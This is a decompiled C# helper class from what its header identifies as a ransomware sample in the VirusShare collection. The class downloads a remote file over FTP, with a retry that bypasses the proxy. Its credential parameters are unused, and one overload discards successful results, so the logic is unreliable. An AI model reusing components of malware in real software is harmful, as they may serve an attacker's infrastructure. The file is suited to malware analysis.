// Decompiled with JetBrains decompiler
// Type: ProxyService.FtpHelper
// Assembly: ProxyService, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: F2B8E9BB-A5D7-4D5C-B4AE-5A3C98D271C3
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00080-msil\Trojan-Ransom.MSIL.Proxy.a-5d65d7203a5637d6cc5764c9c504b661d11d754618d256d3ba43309573d0cd77.exe

using System;
using System.IO;
using System.Net;

namespace ProxyService
{
  public class FtpHelper
  {
    public static string GetXml(string uri, string user, string pass, bool noproxy)
    {
      try
      {
        FtpWebRequest ftpWebRequest = (FtpWebRequest) WebRequest.Create(uri);
        ftpWebRequest.Method = "RETR";
        if (noproxy)
          ftpWebRequest.Proxy = (IWebProxy) null;
        FtpWebResponse response = (FtpWebResponse) ftpWebRequest.GetResponse();
        StreamReader streamReader = new StreamReader(response.GetResponseStream());
        string end = streamReader.ReadToEnd();
        streamReader.Close();
        response.Close();
        return end;
      }
      catch (Exception ex)
      {
      }
      return "";
    }

    public static string GetXml(string uri, string user, string pass) => FtpHelper.GetXml(uri, user, pass, false) == "" ? FtpHelper.GetXml(uri, user, pass, true) : "";
  }
}
